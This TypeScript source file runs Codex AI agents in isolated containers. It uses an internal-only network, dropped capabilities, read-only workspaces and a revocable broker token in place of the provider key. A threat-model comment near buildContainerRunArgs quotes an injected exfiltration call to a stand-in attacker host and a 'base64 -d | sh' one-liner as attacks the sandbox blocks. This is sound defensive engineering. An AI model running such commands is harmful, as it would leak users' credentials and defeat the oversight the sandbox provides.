import { execFile, spawn, type ChildProcess } from "node:child_process";
import { readFile } from "node:fs/promises";
import { promisify } from "node:util";
import { MODEL_API_KEY_ENV, type AppConfig } from "./config.js";
import { buildCodexArgs, PolicyAbortError } from "./codex-runner.js";
import { RunCancelledError } from "./errors.js";
import { sandboxModeForBudget, workspaceIsWritable } from "./middleware/capability.js";
import { CodexEventConsumer } from "./middleware/event-stream.js";
import type {
  AgentRunner,
  DegradedControl,
  RunnerRequest,
  RunnerResult,
} from "./types.js";

const execFileAsync = promisify(execFile);

/** Where the Agent workspace is mounted inside the Runtime. */
export const WORKSPACE_MOUNT = "/workspace";

interface ActiveContainer {
  child: ChildProcess;
  containerName: string;
  cancelled: boolean;
  timedOut: boolean;
  outputExceeded: boolean;
  policyAborted: string | null;
  settled: Promise<void>;
  termination: Promise<void> | null;
}

/**
 * Translate a path the control plane sees into the path the container engine will see.
 *
 * Needed only when the control plane is itself containerised and talks to the engine over
 * a mounted socket: `docker run --mount src=...` is resolved by the daemon on the HOST, so
 * an in-container path such as /app/workspaces would silently create an empty directory.
 */
export function toHostPath(
  candidate: string,
  containerRoot: string,
  hostRoot: string | null,
): string {
  if (!hostRoot) return candidate;
  const root = containerRoot.replace(/\/+$/, "");
  if (candidate === root) return hostRoot;
  if (candidate.startsWith(root + "/")) {
    return hostRoot.replace(/\/+$/, "") + candidate.slice(root.length);
  }
  return candidate;
}

export function containerName(agentId: string, instanceId = "default"): string {
  const safeInstance = instanceId.replace(/[^a-zA-Z0-9_.-]/g, "-").slice(0, 32);
  const safeAgent = agentId.replace(/[^a-zA-Z0-9_.-]/g, "-").slice(0, 48);
  return "launchpad-" + safeInstance + "-" + safeAgent;
}

/**
 * L2 - the deterministic boundary.
 *
 * Three things here are what actually stop the credential-exfiltration chain, and none of
 * them depend on the model behaving:
 *
 *  1. `--network <internal network>` — the Runtime has no route off the host. The only
 *     reachable endpoint is the credential broker on the network gateway. An injected
 *     `fetch("https://attacker.tld")` fails at the kernel, not at a filter.
 *  2. No `ARK_API_KEY` passthrough — the Runtime receives a run-scoped broker token that
 *     is revoked when the turn ends.
 *  3. A per-Agent Codex home — one Agent can no longer read another Agent's sessions
 *     (the IsolateGPT hub-and-spoke idea, NDSS 2025, reduced to this platform).
 *  4. A workspace mounted read-only whenever the budget grants no `write`, and a Codex
 *     sandbox level derived from the same budget. Both are kernel-enforced, so an
 *     obfuscated command gains nothing: `echo x > f`, `base64 -d | sh`, and an
 *     interpreter one-liner all fail identically on a read-only filesystem.
 */
export function buildContainerRunArgs(
  request: RunnerRequest,
  config: AppConfig,
  networkName: string,
): string[] {
  const name = containerName(request.agentId, config.runtimeInstanceId);
  const engineName = config.containerEngine.split(/[\\/]/).at(-1)?.toLowerCase();
  const workspaceSource = toHostPath(
    request.workspacePath,
    config.workspaceRoot,
    config.runtimeHostWorkspaceRoot,
  );
  const codexHomeSource = toHostPath(
    request.codexHome,
    config.codexHome,
    config.runtimeHostCodexHome,
  );
  const writable = workspaceIsWritable(request.budget);
  const sandboxMode = sandboxModeForBudget(request.budget, config.codexSandboxMode);
  return [
    "run",
    "--rm",
    "--init",
    "--name",
    name,
    "--label",
    "io.codejam.launchpad=agent-runtime",
    "--label",
    "io.codejam.agent-id=" + request.agentId,
    "--label",
    "io.codejam.instance-id=" + config.runtimeInstanceId,
    "--label",
    "io.codejam.run-id=" + request.runId,
    ...(engineName === "podman" ? ["--userns", "keep-id"] : []),
    // Internal network: containers reach each other and the gateway, never the internet.
    "--network",
    networkName,
    "--security-opt",
    "no-new-privileges",
    "--cap-drop",
    "ALL",
    "--cpus",
    String(config.containerCpuLimit),
    "--memory",
    config.containerMemoryLimit,
    "--pids-limit",
    String(config.containerPidsLimit),
    "--user",
    config.containerUser,
    // The run-scoped broker token, not the real provider key. NOTE: this is the
    // `NAME=value` form on purpose. The bare `--env NAME` form would pass the control
    // plane's own value through, which is exactly the credential leak L2 exists to stop.
    "--env",
    MODEL_API_KEY_ENV + "=" + request.brokerToken,
    "--env",
    "CODEX_HOME=/codex-home",
    "--env",
    "HOME=/tmp",
    "--env",
    "NO_COLOR=1",
    "--mount",
    // Kernel-enforced: with no `write` class the workspace is not writable at all.
    "type=bind,src=" + workspaceSource + ",dst=" + WORKSPACE_MOUNT + (writable ? "" : ",readonly"),
    // Per-Agent Codex home. Nothing from another Agent is visible.
    "--mount",
    "type=bind,src=" + codexHomeSource + ",dst=/codex-home",
    "--workdir",
    WORKSPACE_MOUNT,
    config.containerRuntimeImage,
    "codex",
    ...buildCodexArgs(request, sandboxMode, WORKSPACE_MOUNT),
  ];
}

export class ContainerCodexRunner implements AgentRunner {
  private readonly active = new Map<string, ActiveContainer>();
  private gatewayAddress = "127.0.0.1";

  constructor(private readonly config: AppConfig) {}

  degradedControls(): DegradedControl[] {
    return [];
  }

  brokerHost(): string {
    return this.gatewayAddress;
  }

  /**
   * Create the isolated Runtime network and work out the address the Runtime should use
   * to reach the credential broker. `--internal` is what removes the default route.
   *
   * Two placements to handle:
   *  - Control plane on the host: the broker is reachable at the network GATEWAY, because
   *    that address belongs to the host itself and needs no forwarding.
   *  - Control plane in a container: a published port would have to be forwarded from the
   *    internal bridge to another bridge, which is exactly what network isolation blocks.
   *    So the control plane joins the Runtime network and advertises its address on it.
   */
  async prepare(): Promise<void> {
    const engine = this.config.containerEngine;
    const network = this.config.runtimeNetwork;
    try {
      await execFileAsync(engine, ["network", "inspect", network], {
        timeout: 10_000,
        env: this.childEnvironment(),
      });
    } catch {
      await execFileAsync(engine, ["network", "create", "--internal", network], {
        timeout: 20_000,
        env: this.childEnvironment(),
      }).catch(() => undefined);
    }

    // A Runtime container orphaned by a crash still holds its name, which would make
    // every subsequent turn for that Agent fail with a name conflict.
    await this.removeOrphanedRuntimes();

    if (this.config.brokerAdvertiseHost) {
      this.gatewayAddress = this.config.brokerAdvertiseHost;
      return;
    }

    const own = await this.joinRuntimeNetwork(network);
    if (own) {
      this.gatewayAddress = own;
      return;
    }

    try {
      const { stdout } = await execFileAsync(
        engine,
        ["network", "inspect", network, "-f", "{{range .IPAM.Config}}{{.Gateway}}{{end}}"],
        { timeout: 10_000, env: this.childEnvironment() },
      );
      const gateway = stdout.trim();
      if (gateway) this.gatewayAddress = gateway;
    } catch {
      // Leave the loopback default; the broker is then unreachable and a run fails
      // loudly rather than silently falling back to a direct Ark connection.
    }
  }

  private async removeOrphanedRuntimes(): Promise<void> {
    const engine = this.config.containerEngine;
    try {
      const { stdout } = await execFileAsync(
        engine,
        [
          "ps",
          "-aq",
          "--filter",
          "label=io.codejam.launchpad=agent-runtime",
          "--filter",
          "label=io.codejam.instance-id=" + this.config.runtimeInstanceId,
        ],
        { timeout: 10_000, env: this.childEnvironment() },
      );
      const ids = stdout.split(/\s+/).filter(Boolean);
      if (ids.length === 0) return;
      await execFileAsync(engine, ["rm", "--force", ...ids], {
        timeout: 30_000,
        env: this.childEnvironment(),
      }).catch(() => undefined);
    } catch {
      // Best effort; a name conflict will still surface as a clear run error.
    }
  }

  /**
   * If this process is itself in a container, attach it to the Runtime network and return
   * its address there. Returns null when running on the host.
   */
  private async joinRuntimeNetwork(network: string): Promise<string | null> {
    const engine = this.config.containerEngine;
    let self: string;
    try {
      self = (await readFile("/etc/hostname", "utf8")).trim();
      if (!self) return null;
      await execFileAsync(engine, ["container", "inspect", self], {
        timeout: 10_000,
        env: this.childEnvironment(),
      });
    } catch {
      return null; // Not containerised, or the id is not a container this engine knows.
    }
    // Already-connected is not an error worth surfacing.
    await execFileAsync(engine, ["network", "connect", network, self], {
      timeout: 15_000,
      env: this.childEnvironment(),
    }).catch(() => undefined);
    try {
      const { stdout } = await execFileAsync(
        engine,
        [
          "container",
          "inspect",
          self,
          "-f",
          '{{with index .NetworkSettings.Networks "' + network + '"}}{{.IPAddress}}{{end}}',
        ],
        { timeout: 10_000, env: this.childEnvironment() },
      );
      return stdout.trim() || null;
    } catch {
      return null;
    }
  }

  async isAvailable(): Promise<boolean> {
    try {
      await execFileAsync(this.config.containerEngine, ["version"], {
        timeout: 5_000,
        env: this.childEnvironment(),
      });
      await execFileAsync(
        this.config.containerEngine,
        ["image", "inspect", this.config.containerRuntimeImage],
        { timeout: 5_000, env: this.childEnvironment() },
      );
      return true;
    } catch {
      return false;
    }
  }

  async cancel(agentId: string): Promise<boolean> {
    const active = this.active.get(agentId);
    if (!active) return false;

    active.cancelled = true;
    await this.removeContainer(active);
    await active.settled;
    return true;
  }

  private removeContainer(active: ActiveContainer): Promise<void> {
    if (!active.termination) {
      active.termination = execFileAsync(
        this.config.containerEngine,
        ["rm", "--force", active.containerName],
        { timeout: 8_000, env: this.childEnvironment() },
      )
        .then(() => undefined)
        .catch(() => {
          active.child.kill("SIGTERM");
          const forceKill = setTimeout(() => active.child.kill("SIGKILL"), 3_000);
          forceKill.unref();
        });
    }
    return active.termination;
  }

  async run(request: RunnerRequest): Promise<RunnerResult> {
    if (this.active.has(request.agentId)) {
      throw new Error("Agent already has an active Runtime container");
    }

    const child = spawn(
      this.config.containerEngine,
      buildContainerRunArgs(request, this.config, this.config.runtimeNetwork),
      {
        cwd: request.workspacePath,
        env: this.childEnvironment(),
        stdio: ["ignore", "pipe", "pipe"],
      },
    );
    const settled = new Promise<void>((resolve) => {
      child.once("close", () => resolve());
      child.once("error", () => resolve());
    });
    const active: ActiveContainer = {
      child,
      containerName: containerName(request.agentId, this.config.runtimeInstanceId),
      cancelled: false,
      timedOut: false,
      outputExceeded: false,
      policyAborted: null,
      settled,
      termination: null,
    };
    this.active.set(request.agentId, active);

    const consumer = new CodexEventConsumer({
      budget: request.budget,
      workspaceMount: WORKSPACE_MOUNT,
      enforcement: this.config.policyEnforcement,
      onEvent: request.onEvent,
      onTerminalViolation: (reason) => {
        active.policyAborted = reason;
        void this.removeContainer(active);
      },
    });

    let stdout = "";
    let stderr = "";
    let totalBytes = 0;

    const consume = (chunk: Buffer, target: "stdout" | "stderr") => {
      totalBytes += chunk.byteLength;
      if (totalBytes > this.config.codexMaxOutputBytes) {
        active.outputExceeded = true;
        void this.removeContainer(active);
        return;
      }
      if (target === "stdout") {
        stdout += chunk.toString("utf8");
        const lines = stdout.split(/\r?\n/);
        stdout = lines.pop() ?? "";
        for (const line of lines) consumer.consumeLine(line);
      } else {
        stderr += chunk.toString("utf8");
        if (stderr.length > 16_384) stderr = stderr.slice(-16_384);
      }
    };

    child.stdout.on("data", (chunk: Buffer) => consume(chunk, "stdout"));
    child.stderr.on("data", (chunk: Buffer) => consume(chunk, "stderr"));

    const timeout = setTimeout(() => {
      active.timedOut = true;
      void this.removeContainer(active);
    }, this.config.codexTimeoutMs);
    timeout.unref();

    try {
      const exitCode = await new Promise<number>((resolve, reject) => {
        child.once("error", reject);
        child.once("close", (code) => resolve(code ?? 1));
      });
      if (stdout.trim()) consumer.consumeLine(stdout.trim());
      if (active.policyAborted) throw new PolicyAbortError(active.policyAborted, consumer);
      if (active.cancelled) throw new RunCancelledError();
      if (active.timedOut) {
        throw new Error("Runtime timed out after " + this.config.codexTimeoutMs + " ms");
      }
      if (active.outputExceeded) {
        throw new Error("Codex output exceeded CODEX_MAX_OUTPUT_BYTES");
      }
      if (exitCode !== 0) {
        const detail = consumer.errors.at(-1) ?? stderr.trim() ?? "No error detail";
        throw new Error(
          this.config.containerEngine + " Runtime exited with code " + exitCode + ": " + detail,
        );
      }
      const output = consumer.messages.at(-1)?.trim();
      if (!output) throw new Error("Codex completed without an agent message");
      return {
        output,
        threadId: consumer.threadId,
        usage: consumer.usage,
        violations: consumer.violations,
        tainted: consumer.tainted,
        taintReasons: [...consumer.taintReasons],
        commandCount: consumer.commandCount,
      };
    } finally {
      clearTimeout(timeout);
      this.active.delete(request.agentId);
    }
  }

  /** The provider key is deliberately absent here: the engine CLI has no need for it. */
  private childEnvironment(): NodeJS.ProcessEnv {
    const environment: NodeJS.ProcessEnv = { NO_COLOR: "1" };
    for (const name of [
      "PATH",
      "HOME",
      "TMPDIR",
      "LANG",
      "LC_ALL",
      "XDG_RUNTIME_DIR",
      "DOCKER_HOST",
    ] as const) {
      if (process.env[name] !== undefined) environment[name] = process.env[name];
    }
    return environment;
  }
}
